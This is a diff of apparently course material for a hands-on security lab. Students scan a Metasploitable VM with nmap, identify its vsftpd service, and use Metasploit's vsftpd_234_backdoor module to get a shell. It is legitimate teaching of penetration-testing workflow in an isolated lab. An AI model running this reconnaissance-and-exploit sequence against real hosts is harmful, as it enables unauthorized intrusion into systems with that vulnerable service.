@@ -48,7 +48,7 @@ The usage of AI tools is allowed to draft the email content.
 
 ---
 
-## Active Scanning (20 min)
+## Vulnerability Scanning (30 min)
 
 In this lab, you will use scanning tools to identify vulnerabilities in a target system.
 
@@ -92,21 +92,169 @@ dvwa-stop
 
 ---
 
-## Vulnerability Scanning (30 min)
+## Vulnerability Scanning Lab (30 minutes)
 
-idee:
-ziel aufspüren, nmap scan, verwundbarkeiten finden, exploitieren mit metasploit
+In this lab you will learn the typical workflow of vulnerability scanning and exploitation:
 
-nach https://medium.com/@mrarslan5156/a-practice-guide-to-exploring-ftp-vulnerabilities-in-metasploitable-2-using-debian-linux-d96f7e7e82fa
+1. Discover a target system  
+2. Identify open services and versions  
+3. Research known vulnerabilities  
+4. Select an appropriate exploit  
+5. Exploit the system 
 
-1. Start the VM 
-2. Find the IP address of the target VM
-   1. Use `ip a` command in the target VM terminal to find the local network IP range (eth1, e.g. 192.168.56.102/24).
-   2. Use `nmap -sn <network-range>` from your Kali VM to find the target VM IP. There will be two devices found called "Oracle VirtualBox virtual NIC", you and the target VM.
-3. Scan the target using nmap: `nmap -sV -p- 192.168.0.237`
-4. focus on ftp service. search for public known vulnerabilities of the ftp service and version
-5. start metasploit `msfconsole`
-todo
+## Step 1: Start the VMs
+1. Make sure the network settings are configured as follows:
+   - it-security-training:
+     - Adapter 1: NAT
+     - Adapter 2: Host-only Adapter
+   - metasploitable:
+     - Adapter 1: Host-only Adapter
+2. Start both virtual machines:
+   - it-security-training
+   - metasploitable
+3. Wait until both systems have fully booted.
+4. Log in to the it-security-training VM with:
+   - Username: kali
+   - Password: kali
+
+## Step 2: Identify the Target IP Address
+
+Before scanning or attacking, you must know where the target system is located in the network.
+
+1. Check your own IP address:
+    ```bash
+    ip a
+    ```
+    Example:
+
+    ```
+    eth1: 192.168.56.101/24
+    ```
+
+    This means the network range is:
+
+    ```
+    192.168.56.0/24
+    ```
+    Write it down.
+2. Discover hosts in the network using a nmap scan:
+    ```bash
+    nmap -sn <ip-range>
+    ```
+    You should see two “Oracle VirtualBox virtual NIC” hosts:
+    - Your attacker VM
+    - The target VM 
+    Write down the target IP.
+
+## Step 3: Scan the Target with Nmap
+
+In this step, we want to identify all open ports and running services, including versions.
+
+For that, run the following nmap scan:
+
+```bash
+nmap -sV -p- <target-ip>
+```
+
+Explanation:
+- `-sV` → service and version detection  
+- `-p-` → scan all 65.535 TCP ports  
+
+
+## Step 4: Focus on the FTP Service
+
+Which FTP service and version is running?
+
+### Research Known Vulnerabilities
+
+Search online for known vulnerabilities of the ftp service.
+
+Write down your results.
+
+
+## Step 5: Start Metasploit
+
+On Kali:
+
+```bash
+msfconsole
+```
+
+Wait until Metasploit finishes loading.
+
+
+## Step 6: Exploit in Metasploit
+
+### Search for the module
+
+```text
+search vsftpd
+```
+
+You should see an entry similar to:
+
+```
+exploit/unix/ftp/vsftpd_234_backdoor
+```
+
+### Select the exploit
+
+```text
+use exploit/unix/ftp/vsftpd_234_backdoor
+```
+
+### View required options
+
+```text
+show options
+```
+
+Relevant options:
+- `RHOSTS` → target IP address
+- `RPORT` → FTP port (default: 21)
+
+### Configure the exploit
+
+```text
+set RHOSTS <target-ip>
+```
+
+### Execute the Exploit
+
+```text
+run
+```
+
+If the exploit is successful, you will immediately receive a shell on the target system.
+
+### Verify Access
+
+Inside the obtained shell:
+
+```bash
+whoami
+```
+
+```bash
+ls
+```
+
+
+
+### Step 7: Interpretation
+
+What happened?
+
+Write down some notes.
+
+
+
+
+
+
+
+
+
 
 ---
 
